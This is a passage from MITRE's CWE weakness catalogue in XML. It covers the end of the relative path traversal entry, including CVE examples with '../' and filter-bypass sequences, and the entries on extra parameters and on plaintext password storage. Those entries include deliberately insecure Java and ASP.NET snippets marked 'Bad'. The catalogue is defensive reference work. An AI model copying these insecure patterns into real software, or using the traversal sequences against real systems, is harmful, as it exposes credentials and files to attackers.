                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-20916</Reference>
               <Description>Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as "../"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-20916</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-24877</Reference>
               <Description>directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-4053</Reference>
               <Description>a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive ("Zip slip") to copy a file outside the intended directory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-10743</Reference>
               <Description>Go-based archive library allows extraction of  files to locations outside of the target folder with "../" path traversal sequences in filenames in a zip file, aka "Zip Slip"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-10743</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0298</Reference>
               <Description>Server allows remote attackers to cause a denial of service via certain HTTP GET requests containing a %2e%2e (encoded dot-dot), several "/../" sequences, or several "../" in a URI.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0298</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0661</Reference>
               <Description>"\" not in denylist for web server, allowing path traversal attacks when the server is run in Windows and other OSes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0661</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0946</Reference>
               <Description>Arbitrary files may be read files via ..\ (dot dot) sequences in an HTTP request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1042</Reference>
               <Description>Directory traversal vulnerability in search engine for web server allows remote attackers to read arbitrary files via "..\" sequences in queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1042</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1209</Reference>
               <Description>Directory traversal vulnerability in FTP server allows remote attackers to read arbitrary files via "..\" sequences in a GET request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1209</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1178</Reference>
               <Description>Directory traversal vulnerability in servlet allows remote attackers to execute arbitrary commands via "..\" sequences in an HTTP request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1178</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1987</Reference>
               <Description>Protection mechanism checks for "/.." but doesn't account for Windows-specific "\.." allowing read of arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1987</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2142</Reference>
               <Description>Directory traversal vulnerability in FTP server allows remote authenticated attackers to list arbitrary directories via a "\.." sequence in an LS command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0160</Reference>
               <Description>The administration function in Access Control Server allows remote attackers to read HTML, Java class, and image files outside the web root via a "..\.." sequence in the URL to port 2002.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0160</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0467</Reference>
               <Description>"\..." in web server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0467</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0963</Reference>
               <Description>"..." in cd command in FTP server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0963</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1193</Reference>
               <Description>"..." in cd command in FTP server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1193</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1131</Reference>
               <Description>"..." in cd command in FTP server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1131</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0480</Reference>
               <Description>read of arbitrary files and directories using GET or CD with "..." in Windows-based FTP server.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0480</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0288</Reference>
               <Description>read files using "." and Unicode-encoded "/" or "\" characters in the URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0288</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0313</Reference>
               <Description>Directory listing of web server using "..."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1658</Reference>
               <Description>Triple dot</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1658</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0240</Reference>
               <Description>read files via "/........../" in URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0240</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0773</Reference>
               <Description>read files via "...." in web server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0773</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1082</Reference>
               <Description>read files via "......" in web server (doubled triple dot?)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1082</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2121</Reference>
               <Description>read files via "......" in web server (doubled triple dot?)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2121</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0491</Reference>
               <Description>multiple attacks using "..", "...", and "...." in different commands</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0491</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0615</Reference>
               <Description>"..." or "...." in chat server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0615</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2169</Reference>
               <Description>chain: ".../...//" bypasses protection mechanism using regexp's that remove "../" resulting in collapse into an unsafe value "../" (CWE-182) and resultant path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2169</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0202</Reference>
               <Description>".../....///" bypasses regexp's that remove "./" and "../"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0202</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1670</Reference>
               <Description>Mail server allows remote attackers to create arbitrary directories via a ".." or rename arbitrary files via a "....//" in user supplied parameters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1670</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Relative Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="139"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-192"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Filenames and Paths&#34;, Page 503"/>
            <Reference External_Reference_ID="REF-1282"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
				<Contribution Type="Feedback">
				  <Contribution_Name>Nick Johnston</Contribution_Name>
				  <Contribution_Date>2022-07-11</Contribution_Date>
				  <Contribution_Comment>Identified weakness in Perl demonstrative example</Contribution_Comment>
				</Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="235" Name="Improper Handling of Extra Parameters" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product does not handle or incorrectly handles when the number of parameters, fields, or arguments with the same name exceeds the expected amount.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="233" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>This typically occurs in situations when only one element is expected to be specified.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2003-1014</Reference>
               <Description>MIE. multiple gateway/security products allow restriction bypass using multiple MIME fields with the same name, which are interpreted differently by clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1014</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Extra Parameter Error</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="460"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This type of problem has a big role in multiple interpretation vulnerabilities and various HTTP attacks.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Description, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Time_of_Introduction</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Extra Parameter Error</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-03-10">Failure to Handle Extra Parameter</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="256" Name="Plaintext Storage of a Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>Storing a password in plaintext may result in a system compromise.</Description>
         <Extended_Description>Password management issues occur when a password is stored in plaintext in an application's properties, configuration file, or memory. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. In some contexts, even storage of a plaintext password in memory is considered a security risk if the password is not cleared immediately after it is used.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this belief makes an attacker's job easier.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid storing passwords in easily accessible locations.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.</Description>
            </Mitigation>
            <Mitigation>
               <Description>A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.</Description>
               <Effectiveness>None</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-57">
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = prop.getProperty("password");<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-58">
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String password = regKey.GetValue(passKey).toString();<xhtml:br/>NetworkCredential netCred = new NetworkCredential(username,password,domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>At least one OT product stored a password in plaintext.</Body_Text>
	         </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30275</Reference>
               <Description>Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30275</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Password Management</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-207"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Name, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-01-30">Plaintext Storage</Previous_Entry_Name>
            <Previous_Entry_Name Date="2018-01-23">Plaintext Storage of a Password</Previous_Entry_Name>
            <Previous_Entry_Name Date="2018-03-27">Plaintext Storage of a Password</Previous_Entry_Name>
			<Previous_Entry_Name Date="2021-07-20">Unprotected Storage of Credentials</Previous_Entry_Name>
         </Content_History>
